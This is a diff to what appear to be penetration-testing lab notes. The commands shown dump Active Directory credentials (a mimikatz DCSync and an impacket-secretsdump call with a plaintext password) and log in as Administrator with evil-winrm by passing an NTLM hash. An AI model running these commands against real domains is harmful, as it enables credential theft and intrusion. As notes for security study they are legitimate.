@@ -138,7 +138,8 @@ lsadump::dcsync /user:corp\Administrator
 //use hashcat to crack it, -m 1000
 
 //in linux
-impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+impacket-secretsdump -just-dc-user Administrator corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 
-python3 psexec.py -k -no-pass corp.com/Administrator@target-server.corp.com
+//if got hash
+evil-winrm -i 192.168.149.70 -u Administrator -H '2892d26cdf84d7a70e2eb3b9f05c425e'
 ```
